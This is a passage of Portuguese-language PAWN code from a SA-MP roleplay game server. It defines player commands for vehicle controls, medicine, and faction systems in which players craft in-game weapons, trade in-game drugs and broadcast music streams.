    if(IsPlayerInAnyVehicle(playerid))
    {
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o condutor do carro!");
		
        new car = GetPlayerVehicleID(playerid);
        
		GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);
	
		if(porma == VEHICLE_PARAMS_OFF)
		{
	    	SetVehicleParamsEx(car, mot, lu, alar, por, cap, VEHICLE_PARAMS_ON, ob);
	    	PlayerActionMessage(playerid, 15.0, "abre a bagageira do veículo.");
		}
		else
		{
	    	SetVehicleParamsEx(car, mot, lu, alar, por, cap, VEHICLE_PARAMS_OFF, ob);
	    	PlayerActionMessage(playerid, 15.0, "fecha a bagageira do veículo.");
		}
	}
	else
	{
	    new car = FindClosestVehicle(playerid);
	    
		if(car == INVALID_VEHICLE_ID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto de nenhum veículo!");
		
		GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);
		
 		if(porma == VEHICLE_PARAMS_OFF)
		{
		    if(cInfo[car][Trancado] == 1) return GameTextForPlayer(playerid, "~r~Trancado.", 1500, 1);
		    
	    	SetVehicleParamsEx(car, mot, lu, alar, por, cap, VEHICLE_PARAMS_ON, ob);
	    	PlayerActionMessage(playerid, 15.0, "abre a bagageira do veículo.");
		}
		else
		{
	    	SetVehicleParamsEx(car, mot, lu, alar, por, cap, VEHICLE_PARAMS_OFF, ob);
	    	PlayerActionMessage(playerid, 15.0, "fecha a o capô do veículo.");
		}
	}

	return 1;
}

COMMAND:luzes(playerid, params[], help)
{
	new mot, lu, alar, por, cap, porma, ob;
	new car = GetPlayerVehicleID(playerid);

	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o condutor do carro!");

	GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);

	if(lu == VEHICLE_PARAMS_OFF)
	{
	    SetVehicleParamsEx(car, mot, VEHICLE_PARAMS_ON, alar, por, cap, porma, ob);
	    PlayerActionMessage(playerid, 15.0, "liga as luzes do veículo.");
	}
	else
	{
	    SetVehicleParamsEx(car, mot, VEHICLE_PARAMS_OFF, alar, por, cap, porma, ob);
	    PlayerActionMessage(playerid, 15.0, "desliga as luzes do veículo.");
	}

	return 1;
}

COMMAND:capo(playerid, params[], help)
{
	new mot, lu, alar, por, cap, porma, ob;
	new car = GetPlayerVehicleID(playerid);

	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o condutor do carro!");

	GetVehicleParamsEx(car, mot, lu, alar, por, cap, porma, ob);

	if(cap == VEHICLE_PARAMS_OFF)
	{
	    SetVehicleParamsEx(car, mot, lu, alar, por, VEHICLE_PARAMS_ON, porma, ob);
	    PlayerActionMessage(playerid, 15.0, "abre o capô do veículo.");
	}
	else
	{
	    SetVehicleParamsEx(car, mot, lu, alar, por, VEHICLE_PARAMS_OFF, porma, ob);
	    PlayerActionMessage(playerid, 15.0, "fecha o capô do veículo.");
	}

	return 1;
}

COMMAND:neon(playerid, params[], help)
{
	new car = GetPlayerVehicleID(playerid);
	
	if(cInfo[car][Neon] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens neons!");

    if(NeonLigado[car] == false)
    {
		if(cInfo[car][Neon] == NEON_VERDE)
		{
	 		neon[car][0] = CreateObject(18649,0,0,0,0,0,0);
	 		neon[car][1] = CreateObject(18649,0,0,0,0,0,0);

			AttachObjectToVehicle(neon[car][0], car, -0.909999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
			AttachObjectToVehicle(neon[car][1], car, 0.914999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);

	  		PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e liga os neons do veículo.");
	  		
	  		NeonLigado[car] = true;

			return 1;
		}
		else if(cInfo[car][Neon] == NEON_AMARELO)
		{
	 		neon[car][0] = CreateObject(18650,0,0,0,0,0,0);
	 		neon[car][1] = CreateObject(18650,0,0,0,0,0,0);

			AttachObjectToVehicle(neon[car][0], car, -0.909999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
			AttachObjectToVehicle(neon[car][1], car, 0.914999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
			
			PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e liga os neons do veículo.");
			
			NeonLigado[car] = true;
		}
		else if(cInfo[car][Neon] == NEON_BRANCO)
		{
	 		neon[car][0] = CreateObject(18652,0,0,0,0,0,0);
	 		neon[car][1] = CreateObject(18652,0,0,0,0,0,0);

			AttachObjectToVehicle(neon[car][0], car, -0.909999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
			AttachObjectToVehicle(neon[car][1], car, 0.914999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);

			PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e liga os neons do veículo.");

			NeonLigado[car] = true;
		}
		else if(cInfo[car][Neon] == NEON_ROSA)
		{
	 		neon[car][0] = CreateObject(18651,0,0,0,0,0,0);
	 		neon[car][1] = CreateObject(18651,0,0,0,0,0,0);

			AttachObjectToVehicle(neon[car][0], car, -0.909999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
			AttachObjectToVehicle(neon[car][1], car, 0.914999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);

			PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e liga os neons do veículo.");

			NeonLigado[car] = true;
		}
		else if(cInfo[car][Neon] == NEON_VERMELHO)
		{
	 		neon[car][0] = CreateObject(18647,0,0,0,0,0,0);
	 		neon[car][1] = CreateObject(18647,0,0,0,0,0,0);

			AttachObjectToVehicle(neon[car][0], car, -0.909999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
			AttachObjectToVehicle(neon[car][1], car, 0.914999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);

			PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e liga os neons do veículo.");

			NeonLigado[car] = true;
		}
		else if(cInfo[car][Neon] == NEON_AZUL)
		{
	 		neon[car][0] = CreateObject(18648,0,0,0,0,0,0);
	 		neon[car][1] = CreateObject(18648,0,0,0,0,0,0);

			AttachObjectToVehicle(neon[car][0], car, -0.909999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);
			AttachObjectToVehicle(neon[car][1], car, 0.914999, -0.009999, -0.649999, 0.000000, 0.000000, 0.000000);

			PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e liga os neons do veículo.");

			NeonLigado[car] = true;
		}
	}
	else
	{
 		DestroyObject(neon[car][0]);
		DestroyObject(neon[car][1]);
		
  		NeonLigado[car] = false;
  		
    	PlayerActionMessage(playerid, 15.0, "carrega no botão por baixo do volante e desliga os neons do veículo.");
	}

	return 1;
}

COMMAND:estatisticas(playerid, params[], help)
{
	ShowStats(playerid, playerid, 0);

	return 1;
}

COMMAND:tomarmedicamentos(playerid, params[], help)
{
    if(pInfo[playerid][Doenca] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás doente");
	if(pInfo[playerid][Medicamentos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens medicamentos");
	if(pInfo[playerid][MedicamentosTomados] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de deixar os medicamentos fazerem efeito");

	pInfo[playerid][Medicamentos] = 0;
	pInfo[playerid][MedicamentosTomados] = 1;
	
	SendClientMessage(playerid, COLOR_INFO, "Tomaste os medicamentos.");

	return 1;
}

COMMAND:ajudamafia(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MAFIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA MÁFIA]: {FFFFFF}/comprarmateriais - /entregarmateriais - /fabricararma");

	return 1;
}

COMMAND:fabricararma(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MAFIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(pInfo[playerid][Materiais] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Materiais");

	new weapid, string[128];

    if(sscanf(params, "d", weapid))
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/vendermateriais <playerid> <weap id>");
	    SendClientMessage(playerid, COLOR_CHAT, "[Weap Id's]: {FFFFFF}1: Faca (1) - 2: Katana (2) - 3: 9mm (3) - 4: 9mm c/Silenciador (4) - 5: Deagle (5) - 6: Shotgun (6)");
	    SendClientMessage(playerid, COLOR_CHAT, "[Weap Id's]: {FFFFFF}7: MP5 (8) - 8: AK-47 (10) - 9: Gés Pimenta (1)");
	    
	    return 1;
	}

    if(weapid <= 0 || weapid > 9) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
    
    new materiaiscusto, nomearma[32], arma;
    
    switch(weapid)
    {
        case 1: { materiaiscusto = 1; nomearma = GetWeapName(4); arma = 4; }
        case 2: { materiaiscusto = 2; nomearma = GetWeapName(8); arma = 8; }
        case 3: { materiaiscusto = 3; nomearma = GetWeapName(22); arma = 22; }
        case 4: { materiaiscusto = 4; nomearma = GetWeapName(23); arma = 23; }
        case 5: { materiaiscusto = 5; nomearma = GetWeapName(24); arma = 24; }
        case 6: { materiaiscusto = 6; nomearma = GetWeapName(25); arma = 25; }
        case 7: { materiaiscusto = 8; nomearma = GetWeapName(29); arma = 29; }
        case 8: { materiaiscusto = 10; nomearma = GetWeapName(30); arma = 30; }
        case 9: { materiaiscusto = 1; nomearma = GetWeapName(41); arma = 41; }
    }

	if(materiaiscusto > pInfo[playerid][Materiais]) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens materiais suficientes");

	pInfo[playerid][Materiais] -= materiaiscusto;
	GivePlayerWeapon(playerid, arma, 60);

	format(string, sizeof(string), "Fabricaste a arma %s. Gastaste %d materiais.", nomearma, materiaiscusto);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:comprarmateriais(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MAFIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(!IsPlayerInRangeOfPoint(playerid, 1.0, oInfo[0][ComprarMateriaisX], oInfo[0][ComprarMateriaisY], oInfo[0][ComprarMateriaisZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no lugar de comprar materiais");

	new qtd, montante, string[128];

    if(sscanf(params, "d", qtd)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/comprarmateriais <quantidade>");

    montante = qtd*PRECO_MATERIAIS;

	if(qtd <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida");
	if(GetPlayerMoneyEx(playerid) < montante) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

	GivePlayerMoneyEx(playerid, -montante);

	pInfo[playerid][PreMateriais] += qtd;

	format(string, sizeof(string), "Compraste %d materiais. Custou-te: %d$. Para venderes armas tens de entregar os materiais. Tens agora: %d pré-materiais.", qtd, montante, pInfo[playerid][PreMateriais]);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:entregarmateriais(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_MAFIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(!IsPlayerInRangeOfPoint(playerid, 1.0, oInfo[0][EntregarMateriaisX], oInfo[0][EntregarMateriaisY], oInfo[0][EntregarMateriaisZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no lugar de entregar materiais");
	if(pInfo[playerid][PreMateriais] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Pré-Materiais");

	new qtd, string[128];

    if(sscanf(params, "d", qtd)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/entregarmateriais <quantidade>");
	if(qtd > pInfo[playerid][PreMateriais]) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida");

	pInfo[playerid][PreMateriais] -= qtd;
	pInfo[playerid][Materiais] += qtd;

	format(string, sizeof(string), "Entregaste %d materiais. Já a podes vender armas. Tens agora %d materiais e %d pré-materiais.", qtd, pInfo[playerid][Materiais], pInfo[playerid][PreMateriais]);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:ajudadrogas(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_DROGAS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA DROGA]: {FFFFFF}/comprardroga - /entregardroga - /venderdroga");

	return 1;
}

COMMAND:venderdroga(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_DROGAS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(pInfo[playerid][Drogas] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Drogas");

	new giveplayerid, qtd, string[128];

    if(sscanf(params, "dd", giveplayerid, qtd)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/venderdroga <playerid> <quantidade>");
    if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
    if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
    if(qtd <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida");
	if(qtd > pInfo[playerid][Drogas]) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida");

	pInfo[playerid][Drogas] -= qtd;
	pInfo[giveplayerid][Drogas] += qtd;

	format(string, sizeof(string), "Vendeste %d drogas ao jogador %s.", qtd, GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "O jogador %s vendeu-te %d drogas.", GetPlayerNameEx(playerid), qtd);
	SendClientMessage(giveplayerid, COLOR_INFO, string);
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "pega num pacote e passa-o sem dar nas vistas a");

	return 1;
}

COMMAND:comprardroga(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_DROGAS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, oInfo[0][ComprarDrogasX], oInfo[0][ComprarDrogasY], oInfo[0][ComprarDrogasZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no lugar de comprar droga");
	
	new qtd, montante, string[128];
	
    if(sscanf(params, "d", qtd)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/comprardroga <quantidade>");
    
    montante = qtd*PRECO_DROGA;
    
	if(qtd <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida");
	if(GetPlayerMoneyEx(playerid) < montante) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	
	GivePlayerMoneyEx(playerid, -montante);
	
	pInfo[playerid][PreDrogas] += qtd;
	
	format(string, sizeof(string), "Compraste %d gramas de droga. Custou-te: %d$. Para a venderes tens de a entregar. Tens agora: %d pré-drogas.", qtd, montante, pInfo[playerid][PreDrogas]);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:entregardroga(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_DROGAS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, oInfo[0][EntregarDrogasX], oInfo[0][EntregarDrogasY], oInfo[0][EntregarDrogasZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no lugar de entregar droga");
	if(pInfo[playerid][PreDrogas] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens Pré-Drogas");

	new qtd, string[128];

    if(sscanf(params, "d", qtd)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/entregardroga <quantidade>");
	if(qtd > pInfo[playerid][PreDrogas]) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida");

	pInfo[playerid][PreDrogas] -= qtd;
	pInfo[playerid][Drogas] += qtd;

	format(string, sizeof(string), "Entregaste %d gramas de droga. Já a podes vender. Tens agora %d drogas e %d pré-drogas.", qtd, pInfo[playerid][Drogas], pInfo[playerid][PreDrogas]);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:ajudanews(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");

	SendClientMessage(playerid, COLOR_CHAT, "[AJUDA NEWS]: {FFFFFF}/noticias - /entrevistar - /musicaslista - /editarmusica - /transmitir - /parartransmissao - /pararentrevista");
    SendClientMessage(playerid, COLOR_CHAT, "[AJUDA NEWS]: {FFFFFF}/pararnoticias");

	return 1;
}

COMMAND:parartransmissao(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	foreach(new i : Player)
	{
		// if(!IsPlayerConnected(i)) continue;
		if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0) continue;
		if(IsPlayerInAnyVehicle(i))
		{
			new car = GetPlayerVehicleID(i);
			if(cInfo[car][RadioStatus] == 0) continue;
		}

		StopAudioStreamForPlayer(i);

		SendClientMessage(i, COLOR_NEWS, "[PARADISE CITY NEWS:] {FFFFFF}Transmissão acabada!");
	}

    return 1;
}

COMMAND:transmitir(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new string[128], numero;

	if(sscanf(params, "d", numero)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/transmitir <número> (/musicaslista para veres todas as músicas)");
	if(numero < 1 || numero > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Número inválido! (1-6)");

	switch(numero)
	{
	    case 1:
	    {
	        format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica1Nome]);
	        
         	foreach(new i : Player)
    		{
        		// if(!IsPlayerConnected(i)) continue;
				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0) continue;
				if(IsPlayerInAnyVehicle(i))
				{
					new car = GetPlayerVehicleID(i);
					if(cInfo[car][RadioStatus] == 0) continue;
				}

				StopAudioStreamForPlayer(i);
				PlayAudioStreamForPlayer(i, oInfo[0][NewsMusica1]);
				
				SendClientMessage(i, COLOR_NEWS, string);
    		}
	    }
	    case 2:
	    {
            format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica2Nome]);
            
         	foreach(new i : Player)
    		{
        		// if(!IsPlayerConnected(i)) continue;
				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
				if(IsPlayerInAnyVehicle(i))
				{
					new car = GetPlayerVehicleID(i);
					if(cInfo[car][RadioStatus] == 0) continue;
				}

				StopAudioStreamForPlayer(i);
				PlayAudioStreamForPlayer(i, oInfo[0][NewsMusica2]);

				SendClientMessage(i, COLOR_NEWS, string);
    		}
	    }
	    case 3:
	    {
            format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica2Nome]);
            
         	foreach(new i : Player)
    		{
        		// if(!IsPlayerConnected(i)) continue;
				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
				if(IsPlayerInAnyVehicle(i))
				{
					new car = GetPlayerVehicleID(i);
					if(cInfo[car][RadioStatus] == 0) continue;
				}

				StopAudioStreamForPlayer(i);
				PlayAudioStreamForPlayer(i, oInfo[0][NewsMusica3]);

				SendClientMessage(i, COLOR_NEWS, string);
    		}
	    }
	    case 4:
	    {
            format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica3Nome]);

         	foreach(new i : Player)
    		{
        		// if(!IsPlayerConnected(i)) continue;
				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
				if(IsPlayerInAnyVehicle(i))
				{
					new car = GetPlayerVehicleID(i);
					if(cInfo[car][RadioStatus] == 0) continue;
				}

				StopAudioStreamForPlayer(i);
				PlayAudioStreamForPlayer(i, oInfo[0][NewsMusica4]);

				SendClientMessage(i, COLOR_NEWS, string);
    		}
	    }
	    case 5:
	    {
            format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica4Nome]);

         	foreach(new i : Player)
    		{
        		// if(!IsPlayerConnected(i)) continue;
				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
				if(IsPlayerInAnyVehicle(i))
				{
					new car = GetPlayerVehicleID(i);
					if(cInfo[car][RadioStatus] == 0) continue;
				}

				StopAudioStreamForPlayer(i);
				PlayAudioStreamForPlayer(i, oInfo[0][NewsMusica5]);

				SendClientMessage(i, COLOR_NEWS, string);
    		}
	    }
	    case 6:
	    {
            format(string, sizeof(string), "[PARADISE CITY NEWS:] {FFFFFF}%s começou a transmitir a música: {FF9900}%s", GetPlayerNameEx(playerid), oInfo[0][NewsMusica5Nome]);

         	foreach(new i : Player)
    		{
        		// if(!IsPlayerConnected(i)) continue;
				if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0)
				if(IsPlayerInAnyVehicle(i))
				{
					new car = GetPlayerVehicleID(i);
					if(cInfo[car][RadioStatus] == 0) continue;
				}

				StopAudioStreamForPlayer(i);
				PlayAudioStreamForPlayer(i, oInfo[0][NewsMusica6]);

				SendClientMessage(i, COLOR_NEWS, string);
    		}
	    }
	}

	format(string, sizeof(string), "Começaste a transmitir a música %d", numero);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:editarmusica(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new string[128], numero, nome[32], link[128];

	if(sscanf(params, "ds[128]s[32]", numero, link, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/editarmusica <número> <link> <nome>");
	if(numero < 1 || numero > 6) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Número inválido! (1-6)");
	
	switch(numero)
	{
	    case 1:
	    {
	    	oInfo[0][NewsMusica1] = link;
	    	oInfo[0][NewsMusica1Alterador] = GetPlayerNameEx(playerid);
	    	oInfo[0][NewsMusica1Nome] = nome;
	    }
	    case 2:
	    {
	    	oInfo[0][NewsMusica2] = link;
	    	oInfo[0][NewsMusica2Alterador] = GetPlayerNameEx(playerid);
	    	oInfo[0][NewsMusica2Nome] = nome;
	    }
	    case 3:
	    {
	    	oInfo[0][NewsMusica3] = link;
	    	oInfo[0][NewsMusica3Alterador] = GetPlayerNameEx(playerid);
	    	oInfo[0][NewsMusica3Nome] = nome;
	    }
	    case 4:
	    {
	    	oInfo[0][NewsMusica4] = link;
	    	oInfo[0][NewsMusica4Alterador] = GetPlayerNameEx(playerid);
	    	oInfo[0][NewsMusica4Nome] = nome;
	    }
	    case 5:
	    {
	    	oInfo[0][NewsMusica5] = link;
	    	oInfo[0][NewsMusica5Alterador] = GetPlayerNameEx(playerid);
	    	oInfo[0][NewsMusica5Nome] = nome;
	    }
	    case 6:
	    {
	    	oInfo[0][NewsMusica6] = link;
	    	oInfo[0][NewsMusica6Alterador] = GetPlayerNameEx(playerid);
	    	oInfo[0][NewsMusica6Nome] = nome;
	    }
	}
	
	format(string, sizeof(string), "Alteraste a música %d para o nome %s com o link '%s'.", numero, nome, link);
	SendClientMessage(playerid, COLOR_INFO, string);

    return 1;
}

COMMAND:musicaslista(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new string[128];
	
	format(string, sizeof(string), "[MÚSICA 1:] {FF9900}Nome: {FFFFFF}%s {FF9900}Alterador: {FFFFFF}%s", oInfo[0][NewsMusica1Nome], oInfo[0][NewsMusica1Alterador]);
	SendClientMessage(playerid, COLOR_NEWS, string);
	format(string, sizeof(string), "[MÚSICA 2:] {FF9900}Nome: {FFFFFF}%s {FF9900}Alterador: {FFFFFF}%s", oInfo[0][NewsMusica2Nome], oInfo[0][NewsMusica2Alterador]);
	SendClientMessage(playerid, COLOR_NEWS, string);
	format(string, sizeof(string), "[MÚSICA 3:] {FF9900}Nome: {FFFFFF}%s {FF9900}Alterador: {FFFFFF}%s", oInfo[0][NewsMusica3Nome], oInfo[0][NewsMusica3Alterador]);
	SendClientMessage(playerid, COLOR_NEWS, string);
	format(string, sizeof(string), "[MÚSICA 4:] {FF9900}Nome: {FFFFFF}%s {FF9900}Alterador: {FFFFFF}%s", oInfo[0][NewsMusica4Nome], oInfo[0][NewsMusica4Alterador]);
	SendClientMessage(playerid, COLOR_NEWS, string);
	format(string, sizeof(string), "[MÚSICA 5:] {FF9900}Nome: {FFFFFF}%s {FF9900}Alterador: {FFFFFF}%s", oInfo[0][NewsMusica5Nome], oInfo[0][NewsMusica5Alterador]);
	SendClientMessage(playerid, COLOR_NEWS, string);
	format(string, sizeof(string), "[MÚSICA 6:] {FF9900}Nome: {FFFFFF}%s {FF9900}Alterador: {FFFFFF}%s", oInfo[0][NewsMusica6Nome], oInfo[0][NewsMusica6Alterador]);
	SendClientMessage(playerid, COLOR_NEWS, string);

    return 1;
}

COMMAND:noticias(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_NEWS) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	
